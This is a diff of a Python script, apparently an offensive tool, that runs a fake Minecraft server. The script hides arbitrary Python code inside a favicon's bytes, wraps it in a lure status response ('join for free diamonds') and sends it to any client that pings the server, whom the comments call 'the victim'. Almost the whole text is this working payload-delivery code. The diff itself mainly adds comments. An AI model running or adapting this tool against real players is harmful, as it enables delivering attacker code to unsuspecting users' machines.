@@ -2,7 +2,6 @@
 # by dropskid @ github.com/dropsql
 # 01.03.2021
 
-
 import os
 import sys
 import json
@@ -18,9 +17,12 @@ from rich.console import Console
 
 console = Console(log_time_format='`%X`')
 
-def make_payload(code: str, favicon: bytes) -> dict:
-    favicon += b'[<code_start>]%s[<code_end>]' % code.encode()
+def make_payload(code: str, favicon: bytes) -> bytes:
+    ''' make a payload '''
+    
+    favicon += b'[<code_start>]%s[<code_end>]' % code.encode() # add the code to the favicon bytes
 
+    # create a fake SLP responce
     payload = json.dumps({
         'version': {
             'name': 'CoolSpigot 1.3.3.7',
@@ -30,13 +32,14 @@ def make_payload(code: str, favicon: bytes) -> dict:
             'online': 0,
         }, 
         'description': 'join for free diamonds',
-        'favicon': f'data:image/png;base64,{base64.b64encode(favicon).decode()}'
+        'favicon': f'data:image/png;base64,{base64.b64encode(favicon).decode()}' # here is the favicon with our code in
     }).encode()
 
-    packet = data_pack(varint_pack(0) + data_pack(payload))
+    packet = data_pack(varint_pack(0) + data_pack(payload)) # make the packet understable by any Minecraft client
     return packet
 
 def varint_unpack(s: bytes) -> Tuple[int, str]:
+    ''' extract varint from bytes '''
     d, l = 0, 0; length = len(s)
     if length > 5:
         length = 5
@@ -47,6 +50,7 @@ def varint_unpack(s: bytes) -> Tuple[int, str]:
     return (d, s[l:])
 
 def varint_pack(digit: int) -> bytes:
+    ''' pack integer to varint '''
     ordinal = b''
     for _ in range(5):
         b = digit & 0x7F; digit >>= 7
@@ -79,22 +83,25 @@ parser.add_argument('--favicon', required=True, metavar='', help='favicon to emb
 
 args = parser.parse_args()
 
+# load the code from the python file
 try:
     code = '\n'.join([x.strip() for x in open(args.payload).readlines()])
 except:
     console.log('failed to load payload code.')
     sys.exit()
 
+# load the favicon from the png file
 try:
     fav = open(args.favicon, 'rb').read()
 except:
     console.log('failed to load favicon.')
     sys.exit()
 
-payload = make_payload(code, fav)
+payload = make_payload(code, fav) # create the payload
 
 console.log(f'new payload lenght: {len(payload)} bytes')
 
+# initialize the server
 server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 
@@ -102,15 +109,19 @@ server.bind((args.host, args.port))
 
 console.log(f'server server listening on "{args.host}:{args.port}"')
 
-server.listen(1337)
+server.listen(1337) # wait for incoming connection
 
-remote_socket, remote_addr = server.accept()
+remote_socket, remote_addr = server.accept() # accept incoming connection
+
+# receive lenght of the whole SLP packet
 buf = remote_socket.recv(1)
 packet_lenght, _ = varint_unpack(buf)
+
+# receive SLP packet
 data = remote_socket.recv(packet_lenght)
 packet_id, data = varint_unpack(data)
 
-if packet_id == 0 and data.endswith(varint_pack(1)):
+if packet_id == 0 and data.endswith(varint_pack(1)): # check if the received packet is a SLP handshake [wiki.vg/Server_List_Ping]
     console.log(f'"{remote_addr[0]}:{remote_addr[1]}" sent SLP packet')
     remote_socket.send(payload) # send the packet to the victim
     console.log('payload has been sent to the victim.')
